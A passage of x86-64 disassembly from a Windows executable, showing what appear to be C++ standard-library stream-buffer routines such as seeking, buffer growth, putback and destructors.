   140007265:	49 8b 53 68          	mov    0x68(%r11),%rdx
   140007269:	48 8b 30             	mov    (%rax),%rsi
   14000726c:	48 8b c2             	mov    %rdx,%rax
   14000726f:	48 2b c6             	sub    %rsi,%rax
   140007272:	4c 3b c8             	cmp    %rax,%r9
   140007275:	77 75                	ja     0x1400072ec
   140007277:	4d 85 c9             	test   %r9,%r9
   14000727a:	74 14                	je     0x140007290
   14000727c:	f6 c3 01             	test   $0x1,%bl
   14000727f:	74 05                	je     0x140007286
   140007281:	4d 85 c0             	test   %r8,%r8
   140007284:	74 66                	je     0x1400072ec
   140007286:	f6 c3 02             	test   $0x2,%bl
   140007289:	74 05                	je     0x140007290
   14000728b:	48 85 c9             	test   %rcx,%rcx
   14000728e:	74 5c                	je     0x1400072ec
   140007290:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007295:	4a 8d 3c 0e          	lea    (%rsi,%r9,1),%rdi
   140007299:	f6 c3 01             	test   $0x1,%bl
   14000729c:	74 14                	je     0x1400072b2
   14000729e:	4d 85 c0             	test   %r8,%r8
   1400072a1:	74 0f                	je     0x1400072b2
   1400072a3:	49 8b 43 38          	mov    0x38(%r11),%rax
   1400072a7:	2b d7                	sub    %edi,%edx
   1400072a9:	48 89 38             	mov    %rdi,(%rax)
   1400072ac:	49 8b 43 50          	mov    0x50(%r11),%rax
   1400072b0:	89 10                	mov    %edx,(%rax)
   1400072b2:	f6 c3 02             	test   $0x2,%bl
   1400072b5:	74 2b                	je     0x1400072e2
   1400072b7:	48 85 c9             	test   %rcx,%rcx
   1400072ba:	74 26                	je     0x1400072e2
   1400072bc:	49 8b 43 58          	mov    0x58(%r11),%rax
   1400072c0:	4c 63 00             	movslq (%rax),%r8
   1400072c3:	49 8b 43 40          	mov    0x40(%r11),%rax
   1400072c7:	4c 03 00             	add    (%rax),%r8
   1400072ca:	49 8b 43 20          	mov    0x20(%r11),%rax
   1400072ce:	44 2b c7             	sub    %edi,%r8d
   1400072d1:	48 89 30             	mov    %rsi,(%rax)
   1400072d4:	49 8b 43 40          	mov    0x40(%r11),%rax
   1400072d8:	48 89 38             	mov    %rdi,(%rax)
   1400072db:	49 8b 43 58          	mov    0x58(%r11),%rax
   1400072df:	44 89 00             	mov    %r8d,(%rax)
   1400072e2:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   1400072e7:	4d 89 0a             	mov    %r9,(%r10)
   1400072ea:	eb 07                	jmp    0x1400072f3
   1400072ec:	49 c7 02 ff ff ff ff 	movq   $0xffffffffffffffff,(%r10)
   1400072f3:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   1400072f8:	33 c0                	xor    %eax,%eax
   1400072fa:	49 c7 42 08 00 00 00 	movq   $0x0,0x8(%r10)
   140007301:	00 
   140007302:	49 89 42 10          	mov    %rax,0x10(%r10)
   140007306:	49 8b c2             	mov    %r10,%rax
   140007309:	5b                   	pop    %rbx
   14000730a:	c3                   	ret
   14000730b:	cc                   	int3
   14000730c:	cc                   	int3
   14000730d:	cc                   	int3
   14000730e:	cc                   	int3
   14000730f:	cc                   	int3
   140007310:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007315:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000731a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000731f:	8b 7c 24 28          	mov    0x28(%rsp),%edi
   140007323:	49 8b f0             	mov    %r8,%rsi
   140007326:	4c 8b da             	mov    %rdx,%r11
   140007329:	48 8b d9             	mov    %rcx,%rbx
   14000732c:	40 f6 c7 01          	test   $0x1,%dil
   140007330:	74 0a                	je     0x14000733c
   140007332:	f6 41 70 04          	testb  $0x4,0x70(%rcx)
   140007336:	74 04                	je     0x14000733c
   140007338:	b1 01                	mov    $0x1,%cl
   14000733a:	eb 02                	jmp    0x14000733e
   14000733c:	32 c9                	xor    %cl,%cl
   14000733e:	40 f6 c7 02          	test   $0x2,%dil
   140007342:	74 0a                	je     0x14000734e
   140007344:	f6 43 70 02          	testb  $0x2,0x70(%rbx)
   140007348:	74 04                	je     0x14000734e
   14000734a:	b0 01                	mov    $0x1,%al
   14000734c:	eb 02                	jmp    0x140007350
   14000734e:	32 c0                	xor    %al,%al
   140007350:	84 c9                	test   %cl,%cl
   140007352:	0f 85 1e 01 00 00    	jne    0x140007476
   140007358:	84 c0                	test   %al,%al
   14000735a:	0f 85 16 01 00 00    	jne    0x140007476
   140007360:	f6 43 70 02          	testb  $0x2,0x70(%rbx)
   140007364:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140007368:	48 8b 08             	mov    (%rax),%rcx
   14000736b:	74 04                	je     0x140007371
   14000736d:	33 d2                	xor    %edx,%edx
   14000736f:	eb 16                	jmp    0x140007387
   140007371:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140007375:	48 8b 10             	mov    (%rax),%rdx
   140007378:	48 85 d2             	test   %rdx,%rdx
   14000737b:	74 0a                	je     0x140007387
   14000737d:	48 39 53 68          	cmp    %rdx,0x68(%rbx)
   140007381:	73 04                	jae    0x140007387
   140007383:	48 89 53 68          	mov    %rdx,0x68(%rbx)
   140007387:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000738b:	4c 8b 43 68          	mov    0x68(%rbx),%r8
   14000738f:	4c 8b 10             	mov    (%rax),%r10
   140007392:	4d 2b c2             	sub    %r10,%r8
   140007395:	45 85 c9             	test   %r9d,%r9d
   140007398:	74 5e                	je     0x1400073f8
   14000739a:	41 83 e9 01          	sub    $0x1,%r9d
   14000739e:	74 0f                	je     0x1400073af
   1400073a0:	41 83 f9 01          	cmp    $0x1,%r9d
   1400073a4:	0f 85 cc 00 00 00    	jne    0x140007476
   1400073aa:	49 8b c0             	mov    %r8,%rax
   1400073ad:	eb 4b                	jmp    0x1400073fa
   1400073af:	8b c7                	mov    %edi,%eax
   1400073b1:	83 e0 03             	and    $0x3,%eax
   1400073b4:	3c 03                	cmp    $0x3,%al
   1400073b6:	0f 84 ba 00 00 00    	je     0x140007476
   1400073bc:	40 f6 c7 01          	test   $0x1,%dil
   1400073c0:	74 16                	je     0x1400073d8
   1400073c2:	48 85 c9             	test   %rcx,%rcx
   1400073c5:	75 09                	jne    0x1400073d0
   1400073c7:	4d 85 d2             	test   %r10,%r10
   1400073ca:	0f 85 a6 00 00 00    	jne    0x140007476
   1400073d0:	48 8b c1             	mov    %rcx,%rax
   1400073d3:	49 2b c2             	sub    %r10,%rax
   1400073d6:	eb 22                	jmp    0x1400073fa
   1400073d8:	40 f6 c7 02          	test   $0x2,%dil
   1400073dc:	0f 84 94 00 00 00    	je     0x140007476
   1400073e2:	48 85 d2             	test   %rdx,%rdx
   1400073e5:	75 09                	jne    0x1400073f0
   1400073e7:	4d 85 d2             	test   %r10,%r10
   1400073ea:	0f 85 86 00 00 00    	jne    0x140007476
   1400073f0:	48 8b c2             	mov    %rdx,%rax
   1400073f3:	49 2b c2             	sub    %r10,%rax
   1400073f6:	eb 02                	jmp    0x1400073fa
   1400073f8:	33 c0                	xor    %eax,%eax
   1400073fa:	4c 8d 0c 30          	lea    (%rax,%rsi,1),%r9
   1400073fe:	4d 3b c8             	cmp    %r8,%r9
   140007401:	77 73                	ja     0x140007476
   140007403:	4d 85 c9             	test   %r9,%r9
   140007406:	74 16                	je     0x14000741e
   140007408:	40 f6 c7 01          	test   $0x1,%dil
   14000740c:	74 05                	je     0x140007413
   14000740e:	48 85 c9             	test   %rcx,%rcx
   140007411:	74 63                	je     0x140007476
   140007413:	40 f6 c7 02          	test   $0x2,%dil
   140007417:	74 05                	je     0x14000741e
   140007419:	48 85 d2             	test   %rdx,%rdx
   14000741c:	74 58                	je     0x140007476
   14000741e:	4b 8d 34 11          	lea    (%r9,%r10,1),%rsi
   140007422:	40 f6 c7 01          	test   $0x1,%dil
   140007426:	74 18                	je     0x140007440
   140007428:	48 85 c9             	test   %rcx,%rcx
   14000742b:	74 13                	je     0x140007440
   14000742d:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140007431:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140007435:	2b ce                	sub    %esi,%ecx
   140007437:	48 89 30             	mov    %rsi,(%rax)
   14000743a:	48 8b 43 50          	mov    0x50(%rbx),%rax
   14000743e:	89 08                	mov    %ecx,(%rax)
   140007440:	40 f6 c7 02          	test   $0x2,%dil
   140007444:	74 2b                	je     0x140007471
   140007446:	48 85 d2             	test   %rdx,%rdx
   140007449:	74 26                	je     0x140007471
   14000744b:	48 8b 43 58          	mov    0x58(%rbx),%rax
   14000744f:	4c 63 00             	movslq (%rax),%r8
   140007452:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140007456:	4c 03 00             	add    (%rax),%r8
   140007459:	48 8b 43 20          	mov    0x20(%rbx),%rax
   14000745d:	44 2b c6             	sub    %esi,%r8d
   140007460:	4c 89 10             	mov    %r10,(%rax)
   140007463:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140007467:	48 89 30             	mov    %rsi,(%rax)
   14000746a:	48 8b 43 58          	mov    0x58(%rbx),%rax
   14000746e:	44 89 00             	mov    %r8d,(%rax)
   140007471:	4d 89 0b             	mov    %r9,(%r11)
   140007474:	eb 07                	jmp    0x14000747d
   140007476:	49 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%r11)
   14000747d:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140007482:	33 c0                	xor    %eax,%eax
   140007484:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140007489:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   14000748e:	49 c7 43 08 00 00 00 	movq   $0x0,0x8(%r11)
   140007495:	00 
   140007496:	49 89 43 10          	mov    %rax,0x10(%r11)
   14000749a:	49 8b c3             	mov    %r11,%rax
   14000749d:	c3                   	ret
   14000749e:	cc                   	int3
   14000749f:	cc                   	int3
   1400074a0:	4c 8b 51 38          	mov    0x38(%rcx),%r10
   1400074a4:	49 8b 12             	mov    (%r10),%rdx
   1400074a7:	48 85 d2             	test   %rdx,%rdx
   1400074aa:	74 4a                	je     0x1400074f6
   1400074ac:	4c 8b 49 50          	mov    0x50(%rcx),%r9
   1400074b0:	49 63 01             	movslq (%r9),%rax
   1400074b3:	48 03 c2             	add    %rdx,%rax
   1400074b6:	48 3b d0             	cmp    %rax,%rdx
   1400074b9:	73 04                	jae    0x1400074bf
   1400074bb:	0f b6 02             	movzbl (%rdx),%eax
   1400074be:	c3                   	ret
   1400074bf:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400074c3:	4c 8b 00             	mov    (%rax),%r8
   1400074c6:	4d 85 c0             	test   %r8,%r8
   1400074c9:	74 2b                	je     0x1400074f6
   1400074cb:	f6 41 70 04          	testb  $0x4,0x70(%rcx)
   1400074cf:	75 25                	jne    0x1400074f6
   1400074d1:	48 8b 41 68          	mov    0x68(%rcx),%rax
   1400074d5:	49 3b c0             	cmp    %r8,%rax
   1400074d8:	49 0f 42 c0          	cmovb  %r8,%rax
   1400074dc:	48 3b c2             	cmp    %rdx,%rax
   1400074df:	76 15                	jbe    0x1400074f6
   1400074e1:	48 89 41 68          	mov    %rax,0x68(%rcx)
   1400074e5:	41 2b 02             	sub    (%r10),%eax
   1400074e8:	41 89 01             	mov    %eax,(%r9)
   1400074eb:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400074ef:	48 8b 08             	mov    (%rax),%rcx
   1400074f2:	0f b6 01             	movzbl (%rcx),%eax
   1400074f5:	c3                   	ret
   1400074f6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400074fb:	c3                   	ret
   1400074fc:	cc                   	int3
   1400074fd:	cc                   	int3
   1400074fe:	cc                   	int3
   1400074ff:	cc                   	int3
   140007500:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140007504:	4c 8b 00             	mov    (%rax),%r8
   140007507:	4d 85 c0             	test   %r8,%r8
   14000750a:	74 40                	je     0x14000754c
   14000750c:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140007510:	4c 3b 00             	cmp    (%rax),%r8
   140007513:	76 37                	jbe    0x14000754c
   140007515:	83 fa ff             	cmp    $0xffffffff,%edx
   140007518:	74 0c                	je     0x140007526
   14000751a:	41 3a 50 ff          	cmp    -0x1(%r8),%dl
   14000751e:	74 06                	je     0x140007526
   140007520:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   140007524:	75 26                	jne    0x14000754c
   140007526:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000752a:	ff 00                	incl   (%rax)
   14000752c:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140007530:	48 ff 08             	decq   (%rax)
   140007533:	83 fa ff             	cmp    $0xffffffff,%edx
   140007536:	74 09                	je     0x140007541
   140007538:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000753c:	48 8b 08             	mov    (%rax),%rcx
   14000753f:	88 11                	mov    %dl,(%rcx)
   140007541:	33 c0                	xor    %eax,%eax
   140007543:	83 fa ff             	cmp    $0xffffffff,%edx
   140007546:	0f 44 d0             	cmove  %eax,%edx
   140007549:	8b c2                	mov    %edx,%eax
   14000754b:	c3                   	ret
   14000754c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140007551:	c3                   	ret
   140007552:	cc                   	int3
   140007553:	cc                   	int3
   140007554:	cc                   	int3
   140007555:	cc                   	int3
   140007556:	cc                   	int3
   140007557:	cc                   	int3
   140007558:	cc                   	int3
   140007559:	cc                   	int3
   14000755a:	cc                   	int3
   14000755b:	cc                   	int3
   14000755c:	cc                   	int3
   14000755d:	cc                   	int3
   14000755e:	cc                   	int3
   14000755f:	cc                   	int3
   140007560:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007565:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000756a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000756f:	57                   	push   %rdi
   140007570:	41 56                	push   %r14
   140007572:	41 57                	push   %r15
   140007574:	48 83 ec 30          	sub    $0x30,%rsp
   140007578:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   14000757c:	44 8b fa             	mov    %edx,%r15d
   14000757f:	48 8b d9             	mov    %rcx,%rbx
   140007582:	0f 85 c2 01 00 00    	jne    0x14000774a
   140007588:	83 fa ff             	cmp    $0xffffffff,%edx
   14000758b:	75 07                	jne    0x140007594
   14000758d:	33 c0                	xor    %eax,%eax
   14000758f:	e9 bb 01 00 00       	jmp    0x14000774f
   140007594:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140007598:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   14000759c:	4c 8b 00             	mov    (%rax),%r8
   14000759f:	48 63 01             	movslq (%rcx),%rax
   1400075a2:	49 8d 34 00          	lea    (%r8,%rax,1),%rsi
   1400075a6:	4d 85 c0             	test   %r8,%r8
   1400075a9:	0f 84 98 00 00 00    	je     0x140007647
   1400075af:	4c 3b c6             	cmp    %rsi,%r8
   1400075b2:	73 25                	jae    0x1400075d9
   1400075b4:	ff c8                	dec    %eax
   1400075b6:	89 01                	mov    %eax,(%rcx)
   1400075b8:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   1400075bc:	48 8b 11             	mov    (%rcx),%rdx
   1400075bf:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400075c3:	48 89 01             	mov    %rax,(%rcx)
   1400075c6:	49 8d 40 01          	lea    0x1(%r8),%rax
   1400075ca:	44 88 3a             	mov    %r15b,(%rdx)
   1400075cd:	48 89 43 68          	mov    %rax,0x68(%rbx)
   1400075d1:	41 8b c7             	mov    %r15d,%eax
   1400075d4:	e9 76 01 00 00       	jmp    0x14000774f
   1400075d9:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400075dd:	48 8b 38             	mov    (%rax),%rdi
   1400075e0:	48 2b f7             	sub    %rdi,%rsi
   1400075e3:	48 83 fe 20          	cmp    $0x20,%rsi
   1400075e7:	72 67                	jb     0x140007650
   1400075e9:	48 81 fe ff ff ff 3f 	cmp    $0x3fffffff,%rsi
   1400075f0:	73 26                	jae    0x140007618
   1400075f2:	48 8d 2c 36          	lea    (%rsi,%rsi,1),%rbp
   1400075f6:	48 85 ed             	test   %rbp,%rbp
   1400075f9:	75 05                	jne    0x140007600
   1400075fb:	45 33 f6             	xor    %r14d,%r14d
   1400075fe:	eb 60                	jmp    0x140007660
   140007600:	48 81 fd 00 10 00 00 	cmp    $0x1000,%rbp
   140007607:	72 4c                	jb     0x140007655
   140007609:	48 8d 4d 27          	lea    0x27(%rbp),%rcx
   14000760d:	48 3b cd             	cmp    %rbp,%rcx
   140007610:	0f 86 52 01 00 00    	jbe    0x140007768
   140007616:	eb 13                	jmp    0x14000762b
   140007618:	bd ff ff ff 7f       	mov    $0x7fffffff,%ebp
   14000761d:	48 3b f5             	cmp    %rbp,%rsi
   140007620:	0f 83 24 01 00 00    	jae    0x14000774a
   140007626:	b9 26 00 00 80       	mov    $0x80000026,%ecx
   14000762b:	e8 f0 11 00 00       	call   0x140008820
   140007630:	48 85 c0             	test   %rax,%rax
   140007633:	0f 84 f7 00 00 00    	je     0x140007730
   140007639:	4c 8d 70 27          	lea    0x27(%rax),%r14
   14000763d:	49 83 e6 e0          	and    $0xffffffffffffffe0,%r14
   140007641:	49 89 46 f8          	mov    %rax,-0x8(%r14)
   140007645:	eb 19                	jmp    0x140007660
   140007647:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000764b:	33 f6                	xor    %esi,%esi
   14000764d:	48 8b 38             	mov    (%rax),%rdi
   140007650:	bd 20 00 00 00       	mov    $0x20,%ebp
   140007655:	48 8b cd             	mov    %rbp,%rcx
   140007658:	e8 c3 11 00 00       	call   0x140008820
   14000765d:	4c 8b f0             	mov    %rax,%r14
   140007660:	4c 8b c6             	mov    %rsi,%r8
   140007663:	48 8b d7             	mov    %rdi,%rdx
   140007666:	49 8b ce             	mov    %r14,%rcx
   140007669:	e8 1d 21 00 00       	call   0x14000978b
   14000766e:	49 8d 14 36          	lea    (%r14,%rsi,1),%rdx
   140007672:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   140007676:	48 89 4b 68          	mov    %rcx,0x68(%rbx)
   14000767a:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000767e:	4c 89 31             	mov    %r14,(%rcx)
   140007681:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140007685:	48 89 11             	mov    %rdx,(%rcx)
   140007688:	41 8b ce             	mov    %r14d,%ecx
   14000768b:	48 8b 43 58          	mov    0x58(%rbx),%rax
   14000768f:	2b ca                	sub    %edx,%ecx
   140007691:	03 cd                	add    %ebp,%ecx
   140007693:	89 08                	mov    %ecx,(%rax)
   140007695:	f6 43 70 04          	testb  $0x4,0x70(%rbx)
   140007699:	74 1a                	je     0x1400076b5
   14000769b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000769f:	4c 89 30             	mov    %r14,(%rax)
   1400076a2:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400076a6:	4c 89 30             	mov    %r14,(%rax)
   1400076a9:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400076ad:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   1400076b3:	eb 29                	jmp    0x1400076de
   1400076b5:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400076b9:	4c 8b 43 68          	mov    0x68(%rbx),%r8
   1400076bd:	48 8b 10             	mov    (%rax),%rdx
   1400076c0:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400076c4:	48 2b d7             	sub    %rdi,%rdx
   1400076c7:	49 03 d6             	add    %r14,%rdx
   1400076ca:	44 2b c2             	sub    %edx,%r8d
   1400076cd:	4c 89 30             	mov    %r14,(%rax)
   1400076d0:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400076d4:	48 89 10             	mov    %rdx,(%rax)
   1400076d7:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400076db:	44 89 00             	mov    %r8d,(%rax)
   1400076de:	f6 43 70 01          	testb  $0x1,0x70(%rbx)
   1400076e2:	74 2c                	je     0x140007710
   1400076e4:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   1400076eb:	72 18                	jb     0x140007705
   1400076ed:	48 8b 47 f8          	mov    -0x8(%rdi),%rax
   1400076f1:	48 83 c6 27          	add    $0x27,%rsi
   1400076f5:	48 2b f8             	sub    %rax,%rdi
   1400076f8:	48 83 ef 08          	sub    $0x8,%rdi
   1400076fc:	48 83 ff 1f          	cmp    $0x1f,%rdi
   140007700:	77 2e                	ja     0x140007730
   140007702:	48 8b f8             	mov    %rax,%rdi
   140007705:	48 8b d6             	mov    %rsi,%rdx
   140007708:	48 8b cf             	mov    %rdi,%rcx
   14000770b:	e8 8c 13 00 00       	call   0x140008a9c
   140007710:	48 8b 43 58          	mov    0x58(%rbx),%rax
   140007714:	83 4b 70 01          	orl    $0x1,0x70(%rbx)
   140007718:	ff 08                	decl   (%rax)
   14000771a:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000771e:	48 8b 11             	mov    (%rcx),%rdx
   140007721:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140007725:	48 89 01             	mov    %rax,(%rcx)
   140007728:	41 8b c7             	mov    %r15d,%eax
   14000772b:	44 88 3a             	mov    %r15b,(%rdx)
   14000772e:	eb 1f                	jmp    0x14000774f
   140007730:	45 33 c9             	xor    %r9d,%r9d
   140007733:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000773a:	00 00 
   14000773c:	45 33 c0             	xor    %r8d,%r8d
   14000773f:	33 d2                	xor    %edx,%edx
   140007741:	33 c9                	xor    %ecx,%ecx
   140007743:	ff 15 07 3c 00 00    	call   *0x3c07(%rip)        # 0x14000b350
   140007749:	cc                   	int3
   14000774a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000774f:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140007754:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140007759:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000775e:	48 83 c4 30          	add    $0x30,%rsp
   140007762:	41 5f                	pop    %r15
   140007764:	41 5e                	pop    %r14
   140007766:	5f                   	pop    %rdi
   140007767:	c3                   	ret
   140007768:	e8 d3 9e ff ff       	call   0x140001640
   14000776d:	cc                   	int3
   14000776e:	cc                   	int3
   14000776f:	cc                   	int3
   140007770:	40 53                	rex push %rbx
   140007772:	48 83 ec 30          	sub    $0x30,%rsp
   140007776:	f6 41 70 01          	testb  $0x1,0x70(%rcx)
   14000777a:	48 8d 05 e7 72 00 00 	lea    0x72e7(%rip),%rax        # 0x14000ea68
   140007781:	48 89 01             	mov    %rax,(%rcx)
   140007784:	48 8b d9             	mov    %rcx,%rbx
   140007787:	74 56                	je     0x1400077df
   140007789:	48 8b 41 40          	mov    0x40(%rcx),%rax
   14000778d:	48 8b 08             	mov    (%rax),%rcx
   140007790:	48 85 c9             	test   %rcx,%rcx
   140007793:	74 0c                	je     0x1400077a1
   140007795:	48 8b 43 58          	mov    0x58(%rbx),%rax
   140007799:	48 63 10             	movslq (%rax),%rdx
   14000779c:	48 03 d1             	add    %rcx,%rdx
   14000779f:	eb 0e                	jmp    0x1400077af
   1400077a1:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400077a5:	48 63 10             	movslq (%rax),%rdx
   1400077a8:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400077ac:	48 03 10             	add    (%rax),%rdx
   1400077af:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400077b3:	48 8b 08             	mov    (%rax),%rcx
   1400077b6:	48 2b d1             	sub    %rcx,%rdx
   1400077b9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400077c0:	72 18                	jb     0x1400077da
   1400077c2:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1400077c6:	48 83 c2 27          	add    $0x27,%rdx
   1400077ca:	48 2b c8             	sub    %rax,%rcx
   1400077cd:	48 83 e9 08          	sub    $0x8,%rcx
   1400077d1:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400077d5:	77 49                	ja     0x140007820
   1400077d7:	48 8b c8             	mov    %rax,%rcx
   1400077da:	e8 bd 12 00 00       	call   0x140008a9c
   1400077df:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400077e3:	33 c9                	xor    %ecx,%ecx
   1400077e5:	48 89 08             	mov    %rcx,(%rax)
   1400077e8:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400077ec:	48 89 08             	mov    %rcx,(%rax)
   1400077ef:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400077f3:	89 08                	mov    %ecx,(%rax)
   1400077f5:	48 8b 43 20          	mov    0x20(%rbx),%rax
   1400077f9:	48 89 08             	mov    %rcx,(%rax)
   1400077fc:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140007800:	48 89 08             	mov    %rcx,(%rax)
   140007803:	48 8b 43 58          	mov    0x58(%rbx),%rax
   140007807:	89 08                	mov    %ecx,(%rax)
   140007809:	83 63 70 fe          	andl   $0xfffffffe,0x70(%rbx)
   14000780d:	48 89 4b 68          	mov    %rcx,0x68(%rbx)
   140007811:	48 8b cb             	mov    %rbx,%rcx
   140007814:	48 83 c4 30          	add    $0x30,%rsp
   140007818:	5b                   	pop    %rbx
   140007819:	48 ff 25 08 39 00 00 	rex.W jmp *0x3908(%rip)        # 0x14000b128
   140007820:	33 c9                	xor    %ecx,%ecx
   140007822:	45 33 c9             	xor    %r9d,%r9d
   140007825:	45 33 c0             	xor    %r8d,%r8d
   140007828:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000782d:	33 d2                	xor    %edx,%edx
   14000782f:	ff 15 1b 3b 00 00    	call   *0x3b1b(%rip)        # 0x14000b350
   140007835:	cc                   	int3
   140007836:	cc                   	int3
   140007837:	cc                   	int3
   140007838:	cc                   	int3
   140007839:	cc                   	int3
   14000783a:	cc                   	int3
   14000783b:	cc                   	int3
   14000783c:	cc                   	int3
   14000783d:	cc                   	int3
   14000783e:	cc                   	int3
   14000783f:	cc                   	int3
   140007840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007845:	57                   	push   %rdi
   140007846:	48 83 ec 20          	sub    $0x20,%rsp
   14000784a:	48 8d b9 58 ff ff ff 	lea    -0xa8(%rcx),%rdi
   140007851:	8b da                	mov    %edx,%ebx
   140007853:	48 8b cf             	mov    %rdi,%rcx
   140007856:	e8 c5 d6 ff ff       	call   0x140004f20
   14000785b:	f6 c3 01             	test   $0x1,%bl
   14000785e:	74 0d                	je     0x14000786d
   140007860:	ba 08 01 00 00       	mov    $0x108,%edx
   140007865:	48 8b cf             	mov    %rdi,%rcx
   140007868:	e8 2f 12 00 00       	call   0x140008a9c
   14000786d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007872:	48 8b c7             	mov    %rdi,%rax
   140007875:	48 83 c4 20          	add    $0x20,%rsp
   140007879:	5f                   	pop    %rdi
   14000787a:	c3                   	ret
   14000787b:	cc                   	int3
   14000787c:	cc                   	int3
   14000787d:	cc                   	int3
   14000787e:	cc                   	int3
   14000787f:	cc                   	int3
   140007880:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007885:	57                   	push   %rdi
   140007886:	48 83 ec 20          	sub    $0x20,%rsp
   14000788a:	8b fa                	mov    %edx,%edi
   14000788c:	48 8b d9             	mov    %rcx,%rbx
   14000788f:	48 8d 05 22 71 00 00 	lea    0x7122(%rip),%rax        # 0x14000e9b8
   140007896:	48 89 01             	mov    %rax,(%rcx)
   140007899:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400078a0:	00 
   1400078a1:	74 2d                	je     0x1400078d0
   1400078a3:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   1400078a7:	48 8d 41 70          	lea    0x70(%rcx),%rax
   1400078ab:	49 39 00             	cmp    %rax,(%r8)
   1400078ae:	75 20                	jne    0x1400078d0
   1400078b0:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   1400078b7:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   1400078be:	49 89 08             	mov    %rcx,(%r8)
   1400078c1:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400078c5:	48 89 08             	mov    %rcx,(%rax)
   1400078c8:	2b d1                	sub    %ecx,%edx
   1400078ca:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400078ce:	89 10                	mov    %edx,(%rax)
   1400078d0:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   1400078d4:	74 08                	je     0x1400078de
   1400078d6:	48 8b cb             	mov    %rbx,%rcx
   1400078d9:	e8 02 08 00 00       	call   0x1400080e0
   1400078de:	48 8b cb             	mov    %rbx,%rcx
   1400078e1:	ff 15 41 38 00 00    	call   *0x3841(%rip)        # 0x14000b128
   1400078e7:	90                   	nop
   1400078e8:	40 f6 c7 01          	test   $0x1,%dil
   1400078ec:	74 0d                	je     0x1400078fb
   1400078ee:	ba 98 00 00 00       	mov    $0x98,%edx
   1400078f3:	48 8b cb             	mov    %rbx,%rcx
   1400078f6:	e8 a1 11 00 00       	call   0x140008a9c
   1400078fb:	48 8b c3             	mov    %rbx,%rax
   1400078fe:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007903:	48 83 c4 20          	add    $0x20,%rsp
   140007907:	5f                   	pop    %rdi
   140007908:	c3                   	ret
   140007909:	cc                   	int3
   14000790a:	cc                   	int3
   14000790b:	cc                   	int3
   14000790c:	cc                   	int3
   14000790d:	cc                   	int3
   14000790e:	cc                   	int3
   14000790f:	cc                   	int3
